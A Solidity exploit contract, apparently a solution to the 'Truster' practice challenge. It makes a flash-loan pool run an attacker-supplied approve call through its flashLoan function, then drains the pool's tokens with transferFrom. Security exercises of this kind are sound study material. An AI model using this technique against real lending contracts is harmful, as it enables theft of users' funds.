// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttack{
    function attack(uint256 amount, address pool, address token) external{
        // 构造approve给攻击合约的calldata
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        // 调用flashLoan执行approve
        TrusterLenderPool(pool).flashLoan(0, msg.sender, token, data);
        IERC20(token).transferFrom(pool, msg.sender, amount);
    }
}